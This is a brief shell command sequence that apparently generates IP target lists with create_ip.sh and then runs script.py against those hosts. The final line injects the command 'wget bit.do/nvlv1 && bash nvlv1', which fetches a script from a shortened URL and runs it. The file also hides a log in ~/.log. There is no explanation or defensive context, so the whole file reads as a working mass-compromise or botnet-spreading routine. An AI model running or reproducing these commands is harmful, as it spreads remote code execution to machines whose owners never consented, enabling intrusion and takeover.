mv log ~/.log

chmod +x create_ip.sh

./create_ip.sh 122 60 0
./create_ip.sh 123 60 0
./create_ip.sh 154 30 0
./create_ip.sh 155 30 0

python2 script.py 'on_ip.txt' ' wget bit.do/nvlv1 && bash nvlv1' 'ii' 
